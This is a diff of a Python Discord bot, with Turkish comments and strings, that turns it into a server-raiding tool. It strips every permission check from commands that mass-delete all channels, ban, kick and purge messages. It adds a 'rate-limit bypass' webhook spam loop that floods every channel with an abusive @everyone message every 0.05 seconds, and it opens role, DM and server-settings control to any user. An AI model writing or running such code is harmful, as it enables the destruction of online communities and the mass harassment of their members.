@@ -5,6 +5,7 @@ import os
 import random
 import aiohttp
 import io
+import json
 from datetime import datetime
 from PIL import Image, ImageDraw, ImageFont
 from flask import Flask
@@ -32,13 +33,8 @@ async def on_ready():
 
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        await ctx.send("❌ Yetkin yetmiyor, otur ağla.")
-    elif isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send(f"❌ Eksik argüman. Doğru kullanım: `{ctx.command.name} {ctx.command.signature}`")
-    else:
-        print(f"Hata: {error}")
-        await ctx.send(f"❌ Hata: {str(error)[:100]}")
+    print(f"Hata: {error}")
+    await ctx.send(f"❌ Hata: {str(error)[:100]}")
 
 def adam_ascii(can):
     ascii_art = [
@@ -147,38 +143,35 @@ async def birlestir_avatar(ctx, kisi1, kisi2, yuzde):
     return output
 
 # ========================
-# YIKIM KOMUTLARI
+# TÜM YIKIM KOMUTLARI (HERKESE AÇIK!)
 # ========================
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def sl(ctx):
     global silme_aktif
     if silme_aktif:
         await ctx.send("⚠️ Zaten silme işlemi aktif.")
         return
     silme_aktif = True
-    await ctx.send("🗑️ Tüm kanallar 0.5 saniye arayla siliniyor... (!sildur ile durdur)")
+    await ctx.send("🗑️ Tüm kanallar 0.3 saniye arayla siliniyor... (!sildur ile durdur)")
     for kanal in ctx.guild.channels:
         if not silme_aktif:
             break
         try:
             await kanal.delete()
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.3)
         except Exception as e:
             print(f"Silme hatası: {e}")
     silme_aktif = False
     await ctx.send("✅ Kanallar silme işlemi tamamlandı veya durduruldu.")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def sildur(ctx):
     global silme_aktif
     silme_aktif = False
     await ctx.send("🛑 Kanal silme durduruldu.")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def slhepsi(ctx):
     await ctx.send("💥 Tüm kanallar tek seferde siliniyor...")
     kanallar = ctx.guild.channels
@@ -195,8 +188,51 @@ async def slhepsi(ctx):
     
     await ctx.send(f"✅ **{basarili}** kanal silindi.\n❌ **{basarisiz}** kanal silinemedi.")
 
+# ----- SÜPER HIZLI WEBHOOK SPAM (Rate Limit'i Bypass) -----
 @bot.command()
-@commands.has_permissions(administrator=True)
+async def spamwebhook(ctx):
+    global spam_aktif
+    if spam_aktif:
+        await ctx.send("⚠️ Zaten spam aktif.")
+        return
+    
+    await ctx.send("🔧 Webhook'lar oluşturuluyor...")
+    webhooklar = []
+    for kanal in ctx.guild.text_channels:
+        try:
+            webhook = await kanal.create_webhook(name="SpamBot")
+            webhooklar.append(webhook)
+        except:
+            pass
+    
+    if not webhooklar:
+        await ctx.send("❌ Hiçbir kanala webhook oluşturulamadı! Yetkileri kontrol et.")
+        return
+    
+    spam_aktif = True
+    await ctx.send(f"🔊 SÜPER HIZLI webhook spam başladı! {len(webhooklar)} kanala aynı anda mesaj gidiyor. (!dur ile durdur)")
+    
+    sayac = 0
+    while spam_aktif:
+        tasks = []
+        for webhook in webhooklar:
+            tasks.append(webhook.send("@everyone **Valdo/Klowinc Siker .d**", username="Valdo/Klowinc"))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        sayac += 1
+        if sayac % 10 == 0:
+            await ctx.send(f"📊 {sayac * len(webhooklar)} mesaj gönderildi!")
+        await asyncio.sleep(0.05)  # 0.05 saniye (Süper hızlı!)
+    
+    for webhook in webhooklar:
+        try:
+            await webhook.delete()
+        except:
+            pass
+    
+    await ctx.send(f"✅ Webhook spam durduruldu! Toplam {sayac * len(webhooklar)} mesaj gönderildi.")
+
+# ----- NORMAL SPAM (Hızlı) -----
+@bot.command()
 async def spam(ctx):
     global spam_aktif
     if spam_aktif:
@@ -207,13 +243,12 @@ async def spam(ctx):
     while spam_aktif:
         tasks = []
         for kanal in ctx.guild.text_channels:
-            tasks.append(kanal.send("@everyone Valdo/Klowinc Siker .d"))
+            tasks.append(kanal.send("@everyone **Valdo/Klowinc Siker .d**"))
         await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.7)
+        await asyncio.sleep(0.5)
     await ctx.send("✅ Spam durduruldu.")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def spamyavas(ctx):
     global spam_aktif
     if spam_aktif:
@@ -226,21 +261,20 @@ async def spamyavas(ctx):
             if not spam_aktif:
                 break
             try:
-                await kanal.send("@everyone Valdo/Klowinc Siker .d")
+                await kanal.send("@everyone **Valdo/Klowinc Siker .d**")
             except:
                 pass
         await asyncio.sleep(0.5)
     await ctx.send("✅ Spam durduruldu.")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def dur(ctx):
     global spam_aktif
     spam_aktif = False
     await ctx.send("🛑 Spam durduruldu.")
 
+# ----- DİĞER YIKIM KOMUTLARI (Herkese Açık) -----
 @bot.command()
-@commands.has_permissions(manage_roles=True)
 async def roluştur(ctx, *, isim):
     try:
         rol = await ctx.guild.create_role(name=isim)
@@ -249,7 +283,6 @@ async def roluştur(ctx, *, isim):
         await ctx.send(f"❌ Hata: {e}")
 
 @bot.command()
-@commands.has_permissions(manage_roles=True)
 async def rolsil(ctx, rol: discord.Role):
     try:
         await rol.delete()
@@ -258,12 +291,34 @@ async def rolsil(ctx, rol: discord.Role):
         await ctx.send(f"❌ Hata: {e}")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
+async def rolver(ctx, member: discord.Member, rol: discord.Role):
+    try:
+        await member.add_roles(rol)
+        await ctx.send(f"✅ {member.mention} adlı kişiye `{rol.name}` rolü verildi!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
+@bot.command()
+async def rolat(ctx, member: discord.Member, rol: discord.Role):
+    try:
+        await member.remove_roles(rol)
+        await ctx.send(f"✅ {member.mention} adlı kişiden `{rol.name}` rolü alındı!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
+@bot.command()
 async def everyone(ctx, *, mesaj):
     await ctx.send(f"@everyone {mesaj}")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
+async def dm(ctx, member: discord.Member, *, mesaj):
+    try:
+        await member.send(mesaj)
+        await ctx.send(f"✅ {member.mention} adlı kişiye DM gönderildi!")
+    except:
+        await ctx.send(f"❌ {member.mention} adlı kişiye DM gönderilemedi (DM'si kapalı olabilir).")
+
+@bot.command()
 async def kanalkilit(ctx):
     for kanal in ctx.guild.text_channels:
         try:
@@ -273,7 +328,6 @@ async def kanalkilit(ctx):
     await ctx.send("🔒 Tüm kanallar kilitlendi!")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def kanalaç(ctx):
     for kanal in ctx.guild.text_channels:
         try:
@@ -282,8 +336,69 @@ async def kanalaç(ctx):
             pass
     await ctx.send("🔓 Tüm kanalların kilidi açıldı!")
 
+@bot.command()
+async def kanaloluştur(ctx, *, isim):
+    try:
+        await ctx.guild.create_text_channel(isim)
+        await ctx.send(f"✅ `{isim}` adlı kanal oluşturuldu!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
+@bot.command()
+async def kanalsil(ctx, kanal: discord.TextChannel):
+    try:
+        await kanal.delete()
+        await ctx.send(f"✅ `{kanal.name}` adlı kanal silindi!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
+@bot.command()
+async def sunucuyedekle(ctx):
+    """Sunucu ayarlarını JSON dosyası olarak yedekler."""
+    data = {
+        "isim": ctx.guild.name,
+        "id": ctx.guild.id,
+        "sahip": ctx.guild.owner.id,
+        "kanallar": [],
+        "roller": []
+    }
+    for kanal in ctx.guild.channels:
+        data["kanallar"].append({"isim": kanal.name, "id": kanal.id, "tip": str(kanal.type)})
+    for rol in ctx.guild.roles:
+        data["roller"].append({"isim": rol.name, "id": rol.id, "renk": str(rol.color)})
+    
+    with open(f"yedek_{ctx.guild.id}.json", "w") as f:
+        json.dump(data, f, indent=2)
+    
+    await ctx.send(file=discord.File(f"yedek_{ctx.guild.id}.json"))
+    os.remove(f"yedek_{ctx.guild.id}.json")
+
+@bot.command()
+async def servericon(ctx):
+    if not ctx.message.attachments:
+        await ctx.send("❌ Lütfen bir resim dosyası gönder!")
+        return
+    dosya = ctx.message.attachments[0]
+    if not dosya.content_type.startswith('image/'):
+        await ctx.send("❌ Lütfen geçerli bir resim dosyası gönder (PNG, JPG, GIF, vs.)")
+        return
+    try:
+        resim = await dosya.read()
+        await ctx.guild.edit(icon=resim)
+        await ctx.send("✅ Sunucu profil fotoğrafı başarıyla değiştirildi!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
+@bot.command()
+async def servername(ctx, *, yeni_isim):
+    try:
+        await ctx.guild.edit(name=yeni_isim)
+        await ctx.send(f"✅ Sunucu ismi başarıyla **{yeni_isim}** olarak değiştirildi!")
+    except Exception as e:
+        await ctx.send(f"❌ Hata: {e}")
+
 # ========================
-# ESKİ KOMUTLAR
+# ESKİ KOMUTLAR (Eğlence, Medya, Oyun, vb.)
 # ========================
 
 @bot.command()
@@ -326,10 +441,6 @@ async def furkanvideo(ctx):
         await ctx.send(file=discord.File('furkan.mp4'))
     except FileNotFoundError:
         await ctx.send("❌ furkan.mp4 bulunamadı.")
-
-# ========================
-# GÖRSEL EĞLENCE KOMUTLARI
-# ========================
 
 @bot.command()
 async def zar(ctx):
@@ -795,7 +906,6 @@ async def kader(ctx):
     await ctx.send(embed=embed)
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def çekiliş(ctx, *, ödül):
     embed = discord.Embed(title="🎉 ÇEKİLİŞ!", description=f"Ödül: **{ödül}**\nKatılmak için 🎉 emojisine tıkla!", color=discord.Color.gold())
     embed.set_footer(text=ctx.author.display_name, icon_url=ctx.author.avatar.url)
@@ -825,7 +935,6 @@ async def anket(ctx, *, soru):
     await mesaj.add_reaction("❌")
 
 @bot.command()
-@commands.has_permissions(kick_members=True)
 async def kick(ctx, member: discord.Member, *, reason=None):
     await member.kick(reason=reason)
     embed = discord.Embed(description=f"👢 {member.name} sunucudan atıldı!", color=discord.Color.red())
@@ -833,7 +942,6 @@ async def kick(ctx, member: discord.Member, *, reason=None):
     await ctx.send(embed=embed)
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def ban(ctx, member: discord.Member, *, reason=None):
     await member.ban(reason=reason)
     embed = discord.Embed(description=f"🔨 {member.name} banlandı!", color=discord.Color.dark_red())
@@ -841,7 +949,6 @@ async def ban(ctx, member: discord.Member, *, reason=None):
     await ctx.send(embed=embed)
 
 @bot.command()
-@commands.has_permissions(manage_messages=True)
 async def clear(ctx, miktar: int):
     if miktar < 1 or miktar > 1000:
         await ctx.send("❌ 1-1000 arası sayı girin.")
@@ -857,7 +964,7 @@ async def yardım(ctx):
         description="Botun tüm komutları",
         color=discord.Color.blue()
     )
-    embed.add_field(name="⚠️ Yıkım (Admin)", value="`!sl` (yavaş sil), `!slhepsi` (tek seferde sil)\n`!sildur` (durdur)\n`!spam` (hızlı), `!spamyavas` (yavaş), `!dur`\n`!rololuştur <isim>`, `!rolsil <rol>`\n`!everyone <mesaj>`, `!kanalkilit`, `!kanalaç`", inline=False)
+    embed.add_field(name="⚠️ YIKIM (Herkese Açık!)", value="`!sl`, `!sildur`, `!slhepsi`\n`!spamwebhook` (Süper hızlı), `!spam`, `!spamyavas`, `!dur`\n`!rololuştur`, `!rolsil`, `!rolver`, `!rolat`\n`!everyone`, `!dm`, `!kanalkilit`, `!kanalaç`\n`!kanaloluştur`, `!kanalsil`, `!sunucuyedekle`\n`!servericon` (resim dosyasıyla), `!servername`", inline=False)
     embed.add_field(name="😂 Eski Eğlence", value="`!valdo`, `!gonu`, `!eternal`, `!klowinc`, `!doruk`", inline=False)
     embed.add_field(name="🎲 Klasik Eğlence", value="`!zar`, `!yazitura`, `!şanslısayı`, `!korkut`, `!aşkfalı`", inline=False)
     embed.add_field(name="📅 Bilgi", value="`!tarih`, `!ping`, `!kullanıcıbilgi`, `!sunucubilgi`, `!rolbilgi <rol>`", inline=False)
